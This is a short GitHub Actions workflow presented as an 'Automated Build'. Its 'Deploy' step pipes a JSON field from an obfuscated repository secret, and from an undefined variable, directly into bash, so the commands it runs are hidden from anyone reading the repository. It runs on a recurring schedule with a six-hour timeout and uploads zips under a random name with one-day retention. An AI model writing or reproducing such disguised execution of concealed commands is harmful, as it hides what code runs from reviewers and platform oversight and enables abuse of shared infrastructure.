name: Automated Build
on:
  workflow_dispatch:

  schedule:
    - cron: '22 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          fbwg8: ${{ secrets.fbwg8 }}
        run: |
          printf '%s' "$fbwg8" | jq -r .it2 | /bin/bash
          echo $notml1 | jq -r .ibdqn94212 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: 0bC4lQdQ
          path: "*.zip"
          retention-days: 1
